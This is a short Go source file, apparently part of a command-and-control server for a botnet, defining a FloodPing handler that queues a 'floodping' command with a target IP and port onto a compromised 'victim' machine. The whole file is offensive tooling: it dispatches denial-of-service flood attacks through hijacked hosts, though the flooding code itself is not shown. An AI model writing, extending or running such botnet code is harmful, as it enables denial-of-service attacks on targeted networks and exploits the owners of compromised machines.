package handlers

import (
	"assimilate/c2c_server/v2/internal/model"
	"assimilate/c2c_server/v2/internal/types"
)

func FloodPing(state *model.ServerState) types.FloodPingHandlerFunc {
	return func(victimHash string, ip string, port string) {
		ipport := ip + ":" + port
		cmd := types.VictimCommand{
			Commandytype: "floodping",
			Arguments:    []string{ipport},
		}

		state.AddCommandToVictim(victimHash, cmd)
	}
}
